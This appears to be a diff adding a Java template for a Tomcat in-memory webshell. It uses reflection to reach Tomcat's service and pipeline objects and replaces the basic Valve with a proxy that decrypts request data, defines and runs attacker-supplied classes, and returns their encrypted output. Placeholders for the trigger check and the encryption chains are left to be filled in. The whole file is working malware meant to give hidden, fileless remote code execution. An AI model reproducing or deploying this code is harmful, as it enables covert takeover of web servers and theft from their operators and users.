@@ -1,0 +1,286 @@
+import java.io.OutputStream;
+import java.lang.reflect.*;
+import java.util.ArrayList;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.URLEncoder;
+
+public class TomcatMemoryShell  extends ClassLoader implements InvocationHandler{
+
+    private Class payload;
+    private Object oldValve = null;
+
+    static {
+        boolean flag = false;
+        try {
+            Class bootstrapClass = Class.forName("org.apache.catalina.startup.Bootstrap");
+            Object services = getFieldValue(getFieldValue(getFieldValue(getFieldValue(bootstrapClass,"daemon"),"catalinaDaemon"),"server"),"services");
+            int arrayLength = Array.getLength(services);
+            for (int i = 0; i < arrayLength; i++) {
+                Object service = Array.get(services,i);
+                if (service!=null){
+                    inject(service);
+                    flag = true;
+                }
+            }
+        }catch (Throwable e){
+
+        }
+        if (!flag){
+            Object service = null;
+            try {
+                service = getService();
+                inject(service);
+            } catch (Throwable e) {
+
+            }
+        }
+
+    }
+
+
+    public TomcatMemoryShell () {
+
+    }
+    public TomcatMemoryShell (ClassLoader loader) {
+        super(loader);
+    }
+
+    public static void setFieldValue(Object obj, String fieldName,Object value) throws Exception {
+        Field f=getField(obj, fieldName);
+        f.setAccessible(true);
+        f.set(obj, value);
+    }
+    public static Object invokeMethod(Object obj,String methodName,Object[] parameters){
+        try {
+            ArrayList classes = new ArrayList();
+            if (parameters!=null){
+                for (int i=0;i<parameters.length;i++){
+                    Object o1=parameters[i];
+                    if (o1!=null){
+                        classes.add(o1.getClass());
+                    }else{
+                        classes.add(null);
+                    }
+                }
+            }
+            Method method=getMethodByClass(obj.getClass(), methodName, (Class[])classes.toArray(new Class[]{}));
+
+            return method.invoke(obj, parameters);
+        }catch (Exception e){
+        }
+        return null;
+    }
+    public Object invokeMethod(Object obj,String methodName,Class[] parameterTypes,Object[] parameters){
+        Object ret = null;
+        try {
+            Method method = obj.getClass().getMethod(methodName,parameterTypes);
+            if (!method.isAccessible()) {
+                method.setAccessible(true);
+            }
+            ret =  method.invoke(obj,parameters);
+        }catch (Throwable e){
+
+        }
+        return ret;
+    }
+
+    public String getRequestURI(Object request){
+        return (String) invokeMethod(request,"getRequestURI",new Class[0],new Object[0]);
+    }
+    public String getParameter(Object request,String name){
+        return (String) invokeMethod(request,"getParameter",new Class[]{String.class},new Object[]{name});
+    }
+    public String getHeader(Object request,String name){
+        return (String) invokeMethod(request,"getHeader",new Class[]{String.class},new Object[]{name});
+    }
+    public String getCookie(Object request,String name){
+        Object cookies = invokeMethod(request,"getCookie",new Class[]{},new Object[]{});
+        String value = null;
+        if (cookies!=null){
+            int cookieCount = Array.getLength(cookies);
+            for (int i = 0; i < cookieCount; i++) {
+                Object cookie = Array.get(cookies,i);
+                String cookieName = (String) invokeMethod(cookie,"getName",new Class[]{},new Object[]{});
+                if (name.equals(cookieName)){
+                    value = (String)invokeMethod(cookie,"getValue",new Class[]{},new Object[]{});
+                    break;
+                }
+            }
+        }
+        return value;
+    }
+    public String getQueryString(Object request){
+        return (String) invokeMethod(request,"getQueryString",new Class[]{},new Object[]{});
+    }
+    public InputStream getInputStream(Object request){
+        return (InputStream) invokeMethod(request,"getInputStream",new Class[]{},new Object[]{});
+    }
+    public OutputStream getOutputStream(Object response){
+        return (OutputStream) invokeMethod(response,"getOutputStream",new Class[]{},new Object[]{});
+    }
+    public void setHeader(Object response,String name,String value){
+        invokeMethod(response,"setHeader",new Class[]{String.class,String.class},new Object[]{name,value});
+    }
+    public void addHeader(Object response,String name,String value){
+        invokeMethod(response,"addHeader",new Class[]{String.class,String.class},new Object[]{name,value});
+    }
+    public void setStatus(Object response,int code){
+        invokeMethod(response,"setStatus",new Class[]{int.class},new Object[]{code});
+    }
+    public void addCookie(Object response,String name,String value){
+        addHeader(response,"Set-Cookie",name+"="+ URLEncoder.encode(value) +"; path=/");
+    }
+
+    public static Method getMethodByClass(Class cs, String methodName, Class... parameters){
+        Method method=null;
+        while (cs!=null){
+            try {
+                method=cs.getDeclaredMethod(methodName, parameters);
+                cs=null;
+            }catch (Exception e){
+                cs=cs.getSuperclass();
+            }
+        }
+        if (method!=null){
+            method.setAccessible(true);
+        }
+        return method;
+    }
+    public static Object getFieldValue(Object obj, String fieldName) {
+        try {
+            return getField(obj,fieldName).get(obj instanceof Class?null:obj);
+        }catch (Exception e){
+            return null;
+        }
+    }
+    public static Field getField(Object obj,String fieldName){
+        if (obj!=null){
+            Class clazz = null;
+            if (obj instanceof Class){
+                clazz = (Class) obj;
+            }else {
+                clazz = obj.getClass();
+            }
+            while (clazz!=null){
+                try {
+                    Field f=clazz.getDeclaredField(fieldName);
+                    f.setAccessible(true);
+                    return f;
+                }catch (Exception e){
+                    clazz=clazz.getSuperclass();
+                }
+            }
+        }
+        return null;
+    }
+
+    public static Object getService() throws Exception {
+        Object o;
+        String s;
+        Thread[] ts = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");
+        for (int i = 0; i < ts.length; i++) {
+            Thread t = ts[i];
+            if (t == null) {
+                continue;
+            }
+            s = t.getName();
+            if (!s.contains("exec") && s.contains("http")) {
+                o = getFieldValue(t, "target");
+                if (!(o instanceof Runnable)) {
+                    continue;
+                }
+                try {
+                    o = getFieldValue(getFieldValue(getFieldValue(o, "this$0"), "handler"), "global");
+                } catch (Exception e) {
+                    continue;
+                }
+                java.util.List ps = (java.util.List) getFieldValue(o, "processors");
+                for (int j = 0; j < ps.size(); j++) {
+                    Object p = ps.get(j);
+                    o = getFieldValue(p, "req");
+                    if (o!=null){
+                        Object obj = getFieldValue(o,"notes");
+                        int max = Array.getLength(obj);
+                        for (int k = 0; k < max; k++) {
+                            Object request = Array.get(obj,k);
+                            if (request!=null){
+                                Object service = getFieldValue(getFieldValue(request,"connector"),"service");
+                                if (service!=null){
+                                    return service;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        return null;
+    }
+    public static void inject(Object service)throws Exception{
+        if (service!=null){
+            Object standardEngine = getFieldValue(service,"container");
+            if (standardEngine==null){
+                standardEngine = getFieldValue(service,"engine");
+            }
+            Object pipeline = invokeMethod(standardEngine,"getPipeline",new Object[0]);
+            ClassLoader pipelineClassLoader = pipeline.getClass().getClassLoader();
+            Class valveClass = pipelineClassLoader.loadClass("org.apache.catalina.Valve");
+            Object valve = getFieldValue(pipeline,"basic");
+            if(valveClass.isAssignableFrom(valve.getClass())){
+                TomcatMemoryShell  newProxyInstance = new TomcatMemoryShell();
+                newProxyInstance.oldValve=valve;
+                Object eivlValve = Proxy.newProxyInstance(pipelineClassLoader, new Class[]{valveClass},newProxyInstance);
+                setFieldValue(pipeline,"basic",eivlValve);
+            }
+        }
+    }
+
+
+    {globalCode}
+    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
+        if ("invoke".equals(method.getName())){
+            try {
+                Object request = args[0];
+                Object response = args[1];
+
+                if ({requestCheck}){
+                    {variable}
+                    {requestChannel}
+                    {requestDecryptionChain}
+                    if (requestData==null || requestData.length==0){
+                        throw new RuntimeException();
+                    }
+                    if (payload == null){
+                        payload = new TomcatMemoryShell(getClass().getClassLoader()).defineClass(requestData,0,requestData.length);
+                    }else {
+                        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
+                        Object f = payload.newInstance();
+                        f.equals(request);
+                        f.equals(arrOut);
+                        f.equals(requestData);
+                        f.toString();
+                        byte[] responseData = arrOut.toByteArray();
+
+                        if (responseData.length == 0){
+                            throw new RuntimeException();
+                        }
+                        arrOut.reset();
+                        Method setSuspendedMethod = getMethodByClass(response.getClass(),"setSuspended",new Class[]{boolean.class});
+                        if (setSuspendedMethod!=null){
+                            setSuspendedMethod.invoke(response,false);
+                        }
+                        {responseEncryptionChain}
+                        {responseBodyAppendStart}
+                        {responseChannel}
+                        {responseBodyAppendEnd}
+                        return null;
+                    }
+                }
+            } catch (Throwable e) {
+                return method.invoke(oldValve, args);
+            }
+        }
+        return method.invoke(oldValve, args);
+    }
+}
